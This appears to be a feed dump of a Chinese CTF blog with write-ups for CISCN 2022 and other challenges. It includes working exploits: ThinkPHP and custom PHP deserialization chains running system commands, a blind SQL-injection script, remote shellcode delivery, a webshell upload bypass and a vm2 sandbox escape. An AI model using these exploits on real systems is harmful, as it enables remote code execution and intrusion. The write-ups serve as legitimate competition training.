&quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#39;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;shiftKeys = &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;output = []keys = open(&#39;1.txt&#39;) //2.txtfor line in keys:    try:        if line[0]!=&#39;0&#39; or (line[1]!=&#39;0&#39; and line[1]!=&#39;2&#39;) or line[3]!=&#39;0&#39; or line[4]!=&#39;0&#39; or line[9]!=&#39;0&#39; or line[10]!=&#39;0&#39; or line[12]!=&#39;0&#39; or line[13]!=&#39;0&#39; or line[15]!=&#39;0&#39; or line[16]!=&#39;0&#39; or line[18]!=&#39;0&#39; or line[19]!=&#39;0&#39; or line[21]!=&#39;0&#39; or line[22]!=&#39;0&#39; or line[6:8]==&quot;00&quot;:             continue        if line[6:8] in normalKeys.keys():            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#39;2&#39;]        else:            output += [&#39;[unknown]&#39;]    except:        passkeys.close()flag=0print(&quot;&quot;.join(output))for i in range(len(output)):    try:        a=output.index(&#39;&lt;DEL&gt;&#39;)        del output[a]        del output[a-1]    except:        passfor i in range(len(output)):    try:        if output[i]==&quot;&lt;CAP&gt;&quot;:            flag+=1            output.pop(i)            if flag==2:                flag=0        if flag!=0:            output[i]=output[i].upper()    except:        passprint (&#39;output :&#39; + &quot;&quot;.join(output))</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529144605125.png" alt="image-20220529144605125"></p><p>发现是一个压缩包，第二个为密码</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529145500226.png" alt="image-20220529145500226"></p><p>解开即可得到flag</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529145515024.png" alt="image-20220529145515024"></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Ezpop"><a href="#Ezpop" class="headerlink" title="Ezpop"></a>Ezpop</h2><p>使用的</p><p><a href="https://www.freebuf.com/vuls/321546.html">https://www.freebuf.com/vuls/321546.html</a></p><p>exp:</p><pre><code class="php">&lt;?phpnamespace think&#123;    abstract class Model&#123;        private $lazySave = false;        private $data = [];        private $exists = false;        protected $table;        private $withAttr = [];        protected $json = [];        protected $jsonAssoc = false;        function __construct($obj = &#39;&#39;)&#123;            $this-&gt;lazySave = True;            $this-&gt;data = [&#39;whoami&#39; =&gt; [&#39;cat /flag.txt&#39;]];            $this-&gt;exists = True;            $this-&gt;table = $obj;            $this-&gt;withAttr = [&#39;whoami&#39; =&gt; [&#39;system&#39;]];            $this-&gt;json = [&#39;whoami&#39;,[&#39;whoami&#39;]];            $this-&gt;jsonAssoc = True;        &#125;    &#125;&#125;namespace think\model&#123;    use think\Model;    class Pivot extends Model&#123;    &#125;&#125;namespace&#123;    echo(urlencode((serialize(new think\model\Pivot(new think\model\Pivot())))));&#125;</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529173238834.png" alt="image-20220529173238834"></p><p>ls / 查看</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529173416181.png" alt="image-20220529173416181"></p><p>读flag</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529111702941.png" alt="image-20220529111702941"></p><h2 id="ezpentest"><a href="#ezpentest" class="headerlink" title="ezpentest"></a>ezpentest</h2><p>waf脚本如下:</p><pre><code class="php">&lt;?phpfunction safe($a) &#123;    $r = preg_replace(&#39;/[\s,()#;*~\-]/&#39;,&#39;&#39;,$a);    $r = preg_replace(&#39;/^.*(?=union|binary|regexp|rlike).*$/i&#39;,&#39;&#39;,$r);    return (string)$r;  &#125;?&gt;</code></pre><p>在比赛中是没有给出代码的</p><p>考察sql注入，和2022虎符babysql很相似。</p><p>可利用case when注入，可构造出payload</p><pre><code>0&#39;||case&#39;1&#39;when`password`collate&#39;utf8mb4_bin&#39;like&#39;&#123;&#125;%&#39;then+18446744073709551615+1+&#39;&#39;else&#39;0&#39;end||&#39;</code></pre><p>过滤了取反导致不能利用<del>0+1来制造溢出,但是我们可以利用 18446744073709551615+1(它就代表</del>0+1)来制造出溢出，当匹配到正确字符时，服务器会报500，否则就返回’0’，服务器会报error。或者用9223372036854775807+1也行</p><p>由此可构造出脚本:</p><pre><code class="python">import requestsimport stringurl = &#39;http://1.14.71.254:28470/login.php&#39;result = &#39;&#39;ceshi = &#39;&#39;lis = string.ascii_letters + string.digits + &quot;^!%@_$%*&quot;gl = &quot;%*()_&quot;while 1:    for i in lis:            if i in gl:  # 这里是对like正则匹配中的一些特殊符号进行转义                i = &quot;\\&quot; + i            ceshi = result + i            payload = &quot;0&#39;||case&#39;1&#39;when`username`collate&#39;utf8mb4_bin&#39;like&#39;&#123;0&#125;%&#39;then+18446744073709551615+1+&#39;&#39;else&#39;0&#39;end||&#39;&quot;.format(ceshi)            #print(payload)            #username 改为 password即可得到密码            data = &#123;                &quot;username&quot;: &quot;666&quot;,                &quot;password&quot;: payload            &#125;            response = requests.post(url, data=data)            if response.status_code == 500:                print(&quot;success!&quot;)                result = result + i                res2 = result                print(res2.replace(&quot;\\&quot;,&quot;&quot;))                break            elif response.status_code == 0:                continue            else:                continue</code></pre><p>可得到账号密码:</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/7%25@@JT7XEDZVT%5DEG%7D%7BJWNSG.png" alt="img"></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604010207219.png" alt="image-20220604010207219"></p><pre><code>nssctfwabbybaboo!@$%!!PAssw40d_Y0u3_Never_Konwn!@!!</code></pre><p>进去后得到一串乱码文件</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604010331417.png" alt="image-20220604010331417"></p><p>查看源代码</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604010813177.png" alt="image-20220604010813177"></p><p>发现是phpjiami加密</p><p>github有相应的工具:<a href="https://github.com/wenshui2008/phpjiami_decode">https://github.com/wenshui2008/phpjiami_decode</a></p><p>但是如果直接复制粘贴下来解密大部分情况都会漏字符，而phpjiami这里解密相对比较苛刻，少一个字符都会解密失败，可以采用脚本把混淆代码保存下来再解密，把url和cookie改成你的就可以了</p><pre><code class="php">&lt;?php$url =&quot;http://1.14.71.254:28470/login.php&quot;;$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt ( $ch, CURLOPT_RETURNTRANSFER, true);curl_setopt ($ch, CURLOPT_COOKIE, &quot;_ga=GA1.1.1492528755.1648872076; session=6fdc00cf-2ec3-4924-b99b-b474ac227c2d; PHPSESSID=cbdac7b296d255ad4c2c69066c4356ec&quot;);$result = curl_exec($ch);curl_close($ch);echo urlencode($result);file_put_contents(&quot;pop.php&quot;,$result);?&gt;</code></pre><p>将生成的文件放入解密脚本</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604013234468.png" alt="image-20220604013234468"></p><p>最终得到一下代码</p><pre><code class="php">&lt;?phpsession_start();if(!isset($_SESSION[&#39;login&#39;]))&#123;    die();&#125;function Al($classname)&#123;    include $classname.&quot;.php&quot;;&#125;if(isset($_REQUEST[&#39;a&#39;]))&#123;    $c = $_REQUEST[&#39;a&#39;];    $o = unserialize($c);    if($o === false) &#123;        die(&quot;Error Format&quot;);    &#125;else&#123;        spl_autoload_register(&#39;Al&#39;);        $o = unserialize($c);        $raw = serialize($o);        if(preg_match(&quot;/Some/i&quot;,$raw))&#123;            throw new Error(&quot;Error&quot;);        &#125;        $o = unserialize($raw);        var_dump($o);    &#125;&#125;else &#123;    echo file_get_contents(&quot;SomeClass.php&quot;);&#125;</code></pre><p>访问:</p><pre><code>view-source:http://1.14.71.254:28470/1Nd3x_Y0u_N3v3R_Kn0W.php</code></pre><p>可得到someclass的代码</p><pre><code class="php">&lt;?phpclass A&#123;    public $a;    public $b;    public function see()    &#123;        $b = $this-&gt;b;        $checker = new ReflectionClass(get_class($b));        if(basename($checker-&gt;getFileName()) != &#39;SomeClass.php&#39;)&#123;            if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123;                ($b-&gt;a)($b-&gt;b.&quot;&quot;);            &#125;        &#125;    &#125;&#125;class B&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;see();        return &quot;1&quot;;    &#125;&#125;class C&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;read();        return &quot;lock lock read!&quot;;    &#125;&#125;class D&#123;    public $a;    public $b;    public function read()    &#123;        $this-&gt;b-&gt;learn();    &#125;&#125;class E&#123;    public $a;    public $b;    public function __invoke()    &#123;        $this-&gt;a = $this-&gt;b.&quot; Powered by PHP&quot;;    &#125;    public function __destruct()&#123;        //eval($this-&gt;a); ??? 吓得我赶紧把后门注释了        //echo &quot;???&quot;;        die($this-&gt;a);    &#125;&#125;class F&#123;    public $a;    public $b;    public function __call($t1,$t2)    &#123;        $s1 = $this-&gt;b;        $s1();    &#125;&#125;?&gt;</code></pre><p>构造pop链，进行反序列化</p><p><strong>spl_autoload_register的作用就是把后面反序列化不存在的类所在的文件加载进来</strong></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604015509088.png" alt="image-20220604015509088"></p><p>由于漏洞代码在SomeClass.php中，所以我们必须包含这个文件。</p><p>这里存在一个过滤</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604170012434.png" alt="image-20220604170012434"></p><p>我们需要让它包含后直接进入destruct魔术函数</p><p>关于gc回收机制可参考这篇文章，写的非常好:<a href="https://blog.csdn.net/qq_51295677/article/details/123520193">https://blog.csdn.net/qq_51295677/article/details/123520193</a></p><p>pop链条的思路非常清晰：</p><pre><code>E的destruct --&gt; B 的toString --&gt; A(rce点)</code></pre><p>最终exp:</p><pre><code class="php">&lt;?phpclass A&#123;    public $a;    public $b;    public function see()    &#123;        $b = $this-&gt;b;        $checker = new ReflectionClass(get_class($b));        if(basename($checker-&gt;getFileName()) != &#39;SomeClass.php&#39;)&#123;            if(isset($b-&gt;a)&amp;&amp;isset($b-&gt;b))&#123;                ($b-&gt;a)($b-&gt;b.&quot;&quot;);            &#125;        &#125;    &#125;&#125;class B&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;see();        return &quot;1&quot;;    &#125;&#125;class C&#123;    public $a;    public $b;    public function __toString()    &#123;        $this-&gt;a-&gt;read();        return &quot;lock lock read!&quot;;    &#125;&#125;class D&#123;    public $a;    public $b;    public function read()    &#123;        $this-&gt;b-&gt;learn();    &#125;&#125;class E&#123;    public $a;    public $b;    public function __invoke()    &#123;        $this-&gt;a = $this-&gt;b.&quot; Powered by PHP&quot;;    &#125;    public function __destruct()&#123;        //eval($this-&gt;a); ??? 吓得我赶紧把后门注释了        //echo &quot;???&quot;;        die($this-&gt;a);    &#125;&#125;class F&#123;    public $a;    public $b;    public function __call($t1,$t2)    &#123;        $s1 = $this-&gt;b;        $s1();    &#125;&#125;class SomeClass&#123;    public $a;&#125;$a = new A();$b = new B();$e = new E();$e -&gt;a = $b; #die函数会把$b当作字符串输出，从而调用了toString魔术方法$b -&gt;a = $a;$arr = new ArrayObject(); #只要是php的原生类即可$arr -&gt; a = &quot;system&quot;;$arr -&gt; b = &quot;ls /&quot;;$a -&gt;b = $arr;$c = new SomeClass();$c -&gt;a =$e;echo(urlencode(str_replace(&quot;i:1&quot;,&quot;i:0&quot;,serialize(array($c,1)))))?&gt;</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604165811456.png" alt="image-20220604165811456"></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220604170425296.png" alt="image-20220604170425296"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="Pwn1"><a href="#Pwn1" class="headerlink" title="Pwn1"></a>Pwn1</h2><p>case1,确保unk_202028和unk_202024为1，</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529174222620.png" alt="image-20220529174222620"></p><p>case2:，unk_202028和unk_202028为1的时候执行写的shellcode，shellcode必须为可见字符：</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529174438381.png" alt="image-20220529174438381"></p><p>生成shellcode可见字符串：</p><p><a href="https://github.com/TaQini/alpha3">https://github.com/TaQini/alpha3</a></p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529140033280.png" alt="image-20220529140033280"></p><p>exp：</p><pre><code class="python">from pwn import*context.log_level = &quot;debug&quot;io = remote(&quot;123.56.111.202&quot;,17395)# io = process(&quot;./login&quot;)io.recv()shellcode = &quot;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;payload = &quot;opt:1\n&quot; + &quot;msg:ro0t1\n&quot;io.sendline(payload)payload = &quot;opt:2\n&quot; + &quot;msg:&quot; + shellcode + &quot;\n&quot;io.sendline(payload)io.interactive()</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529140131706.png" alt="image-20220529140131706"></p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>swift的AST树</p><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529201512778.png" alt="image-20220529201512778"></p><p>参照swiftc的输出</p><p>构造出脚本</p><pre><code class="c">#include &lt;stdio.h&gt;unsigned char b[] = &#123;88, 35, 88, 225, 7, 201, 57, 94, 77, 56, 75, 168, 72, 218, 64, 91, 16, 101, 32, 207, 73, 130, 74, 128, 76, 201, 16, 248, 41, 205, 103, 84, 91, 99, 79, 202, 22, 131, 63, 255, 20, 16&#125;;unsigned char k[] = &quot;345y&quot;;int main()&#123;    for (int i = 0; i &lt; 42 - 3; i++)    &#123;        unsigned char tmp = k[0];        k[0] = k[1];        k[1] = k[2];        k[2] = k[3];        k[3] = tmp;    &#125;    for (int i = 42 - 4; i &gt;= 0; i--)    &#123;        unsigned char r0 = b[i + 0], r1 = b[i + 1], r2 = b[i + 2], r3 = b[i + 3];        unsigned char tmp = k[3];        k[3] = k[2];        k[2] = k[1];        k[1] = k[0];        k[0] = tmp;        b[i + 0] = r2 ^ k[2];        b[i + 1] = r3 ^ k[3];        b[i + 2] = ((k[0] + (b[i + 0] &gt;&gt; 4)) &amp; 0xff) ^ r0;        b[i + 3] = ((k[1] + (b[i + 1] &gt;&gt; 2)) &amp; 0xff) ^ r1;    &#125;    for (int i = 0; i &lt; 42; i++)    &#123;        printf(&quot;%c&quot;, b[i]);    &#125;    return 0;&#125;</code></pre><p><img src="/2022/06/20/ciscn2022%E5%88%9D%E8%B5%9B/image-20220529201614424.png" alt="image-20220529201614424"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;crypto&quot;&gt;&lt;a href=&quot;#crypto&quot; class=&quot;headerlink&quot; title=&quot;crypto&quot;&gt;&lt;/a&gt;crypto&lt;/h1&gt;&lt;h2 id=&quot;签到&quot;&gt;&lt;a href=&quot;#签到&quot; class=&quot;headerlink&quot;</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="ciscn" scheme="https://sakurahack-y.github.io/tags/ciscn/"/>
    
  </entry>
  
  <entry>
    <title>web随缘刷</title>
    <link href="https://sakurahack-y.github.io/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/"/>
    <id>https://sakurahack-y.github.io/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/</id>
    <published>2022-05-19T04:22:18.000Z</published>
    <updated>2022-06-27T02:33:28.870Z</updated>
    
    <content type="html"><![CDATA[<p>唉，ciscn快开了，ctf太卷了，做做以前题练一下手吧</p><p>[TOC]</p><h1 id="CISCN2021-Quals-upload"><a href="#CISCN2021-Quals-upload" class="headerlink" title="[CISCN2021 Quals]upload"></a>[CISCN2021 Quals]upload</h1><p>源码:</p><pre><code class="php">&lt;?phpif (!isset($_GET[&quot;ctf&quot;])) &#123;    highlight_file(__FILE__);    die();&#125;if(isset($_GET[&quot;ctf&quot;]))    $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;upload&quot;) &#123;    if ($_FILES[&#39;postedFile&#39;][&#39;size&#39;] &gt; 1024*512) &#123;        die(&quot;这么大个的东西你是想d我吗？&quot;);    &#125;    $imageinfo = getimagesize($_FILES[&#39;postedFile&#39;][&#39;tmp_name&#39;]);    if ($imageinfo === FALSE) &#123;        die(&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;);    &#125;    if ($imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1) &#123;        die(&quot;东西不能方方正正的话就很讨厌&quot;);    &#125;    $fileName=urldecode($_FILES[&#39;postedFile&#39;][&#39;name&#39;]);    if(stristr($fileName,&quot;c&quot;) || stristr($fileName,&quot;i&quot;) || stristr($fileName,&quot;h&quot;) || stristr($fileName,&quot;ph&quot;)) &#123;        die(&quot;有些东西让你传上去的话那可不得了&quot;);    &#125;    $imagePath = &quot;image/&quot; . mb_strtolower($fileName);    if(move_uploaded_file($_FILES[&quot;postedFile&quot;][&quot;tmp_name&quot;], $imagePath)) &#123;        echo &quot;upload success, image at $imagePath&quot;;    &#125; else &#123;        die(&quot;传都没有传上去&quot;);    &#125;&#125;</code></pre><p>审计下这个代码，传一个文件，校验大小–&gt;校验图片高和宽–&gt;过滤’c’,’i’,’h’,’ph’–&gt;成功上传or失败</p><p>无法上传php🐎，无法利用.htacess和.user.ini，</p><p>那就</p><p>扫描一下目录，又发现了一个源码</p><p>example.php</p><pre><code class="php"> &lt;?phpif (!isset($_GET[&quot;ctf&quot;])) &#123;    highlight_file(__FILE__);    die();&#125;if(isset($_GET[&quot;ctf&quot;]))    $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;poc&quot;) &#123;    $zip = new \ZipArchive();    $name_for_zip = &quot;example/&quot; . $_POST[&quot;file&quot;];    if(explode(&quot;.&quot;,$name_for_zip)[count(explode(&quot;.&quot;,$name_for_zip))-1]!==&quot;zip&quot;) &#123;        die(&quot;要不咱们再看看？&quot;);    &#125;    if ($zip-&gt;open($name_for_zip) !== TRUE) &#123;        die (&quot;都不能解压呢&quot;);    &#125;    echo &quot;可以解压，我想想存哪里&quot;;    $pos_for_zip = &quot;/tmp/example/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]);    $zip-&gt;extractTo($pos_for_zip);    $zip-&gt;close();    unlink($name_for_zip);    $files = glob(&quot;$pos_for_zip/*&quot;);    foreach($files as $file)&#123;        if (is_dir($file)) &#123;            continue;        &#125;        $first = imagecreatefrompng($file);        $size = min(imagesx($first), imagesy($first));        $second = imagecrop($first, [&#39;x&#39; =&gt; 0, &#39;y&#39; =&gt; 0, &#39;width&#39; =&gt; $size, &#39;height&#39; =&gt; $size]);        if ($second !== FALSE) &#123;            $final_name = pathinfo($file)[&quot;basename&quot;];            imagepng($second, &#39;example/&#39;.$final_name);            imagedestroy($second);        &#125;        imagedestroy($first);        unlink($file);    &#125;&#125;</code></pre><p>这段代码的大致作用是解压一个zip文件，那我们就要思考是否可以把php放入zip中，那就需要我们上传一个zip文件，但是i被过滤</p><p>这里可以利用mb_strtolower函数绕过，它是支持Unicode的</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519123323158.png" alt="image-20220519123323158"></p><p>大致的意思就是我们可以用一个字符Unicode去替换i</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519123635184.png" alt="image-20220519123635184"></p><pre><code class="php">&lt;?phpvar_dump(mb_strtolower(&#39;İ&#39;)===&#39;i&#39;);?&gt;</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519123728624.png" alt="image-20220519123728624"></p><p>详见:<a href="https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/">https://blog.rubiya.kr/index.php/2018/11/29/strtoupper/</a></p><p>绕过了i之后我们还要绕过高和宽</p><p>我们可以利用xmb绕过</p><pre><code>#define test_width 1#define test_height 1</code></pre><p>除此之外它还有一个函数过滤，阻止我们在图片中放入恶意的php</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519124806416.png" alt="image-20220519124806416"></p><p>通常，系统在实现图片上传功能时，为了防范用户上传含有恶意 php 代码的图片，可采用 gd 库重建图片，gd 库重建图片的一系列函数 imagecreatefrom*，会检查图片规范，验证图片合法性，以此抵御图片中含有恶意 php 代码的攻击。</p><p>如果直接在图片最后写一个一句话木马，会被GD库给去掉。绕过GD库可以参考这篇文章：<a href="http://www.vuln.cn/6411">http://www.vuln.cn/6411</a></p><p>我们可以使用工具:<a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator%E6%9D%A5%E5%B8%AE%E5%8A%A9%E6%88%91%E4%BB%AC%E7%BB%95%E8%BF%87">https://github.com/huntergregal/PNG-IDAT-Payload-Generator来帮助我们绕过</a></p><p>使用脚本生成图片🐎</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519125046671.png" alt="image-20220519125046671"></p><p>修改后缀为php并放入zip中</p><p>创建一个txt文件，里面写入</p><pre><code>#define test_width 1#define test_height 1</code></pre><p>注:第一行要空出来换行，不然无法识别</p><p>然后将txt追加到zip后</p><pre><code>copy shell.zip/b+1.txt/a dd.zip</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519130016829.png" alt="image-20220519130016829"></p><p>然后就可以来上传了</p><p>自己构建一个html post文件上传界面:</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://05b1ebab-02ca-4b72-bf12-1b21695d609d.node4.buuoj.cn:81/upload.php?ctf=upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;postedFile&quot; id=&quot;postedFile&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519125541638.png" alt="image-20220519125541638"></p><p>抓包，修改i</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519130133680.png" alt="image-20220519130133680"></p><p>成功上传</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519130059694.png" alt="image-20220519130059694"></p><p>然后使用example页面解压</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519133936518.png" alt="image-20220519133936518"></p><p>成功解压，运行下</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519134029090.png" alt="image-20220519134029090"></p><p>下面来找flag</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519134213040.png" alt="image-20220519134213040"></p><p>读取下这个文件</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519134241496.png" alt="image-20220519134241496"></p><h1 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h1><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519144418792.png" alt="image-20220519144418792"></p><p>真的是php吗？</p><p>既然这么提示了那肯定不是，测一下node.js</p><p>传入 Error().stack</p><p><img src="/2022/05/19/web%E9%9A%8F%E7%BC%98%E5%88%B7/image-20220519145031732.png" alt="image-20220519145031732"></p><p>确实是js，是vm2的沙箱逃逸问题</p><p>github有现成poc:</p><pre><code class="js">&quot;use strict&quot;;const &#123;VM&#125; = require(&#39;vm2&#39;);const untrusted = &#39;(&#39; + function()&#123;    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();    try&#123;        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;    &#125;catch(e)&#123;        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();    &#125;&#125;+&#39;)()&#39;;try&#123;    console.log(new VM().run(untrusted));&#125;catch(x)&#123;    